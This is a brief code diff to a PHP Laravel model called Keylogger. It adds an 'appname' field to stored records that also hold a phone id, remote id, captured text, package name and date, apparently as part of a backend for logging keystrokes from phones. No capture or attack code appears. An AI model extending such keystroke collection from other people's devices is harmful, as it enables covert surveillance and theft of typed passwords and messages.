@@ -16,6 +16,7 @@ use Illuminate\Database\Eloquent\Model;
  * @property int $phone_id
  * @property int|null $remote_id
  * @property string|null $text
+ * @property string|null $appname
  * @property string|null $package
  * @property Carbon|null $date
  * 
@@ -41,6 +42,7 @@ class Keylogger extends Model
 		'phone_id',
 		'remote_id',
 		'text',
+		'appname',
 		'package',
 		'date'
 	];
